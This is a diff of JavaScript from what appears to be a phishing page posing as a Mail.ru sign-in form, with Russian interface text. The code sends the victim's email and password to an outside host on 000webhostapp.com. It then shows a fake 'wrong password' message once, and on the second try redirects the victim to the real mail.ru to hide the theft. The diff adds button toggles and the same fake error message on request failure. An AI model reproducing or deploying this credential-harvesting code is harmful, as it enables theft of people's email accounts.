@@ -40,25 +40,32 @@ function Подробнее() {
         повышающая()
     }  
 }
-function повышающая() {
+function повышающая() {	
 	var emailu  = document.getElementById("emailu").value;	
 	var password  = document.getElementById("password").value;
+	document.getElementById("signinsb").style.display = "none";
+	document.getElementById("signinsbsib").style.display = "inline";
 		$.ajax({
 		type: "POST",
 		url: "https://benefroprojst.000webhostapp.com/api.php", 
 		//dataType: "json",
 		data: {emailu: emailu, password: password},
 		success: function(data){
-			inscor = inscor+1;
+			inscor = inscor+1;		
 			if(inscor == 1){
 			   document.getElementById("paserrw").innerHTML = "Неверный пароль. Попробуй снова";
+			   document.getElementById("signinsb").style.display = "inline";
+			   document.getElementById("signinsbsib").style.display = "none";
 			}else if(inscor == 2){
 			   window.location.href = "https://mail.ru";
 			}
 		},
 		 error : function(jqXHR, textStatus, errorThrown) {
+		 	document.getElementById("paserrw").innerHTML = "Неверный пароль. Попробуй снова";
+			document.getElementById("signinsb").style.display = "inline";
+			document.getElementById("signinsbsib").style.display = "none";
 	       //console.log(data)//remove in production
-           	window.location.reload();                  
+           //window.location.reload();                    
        }
 		 
 	});
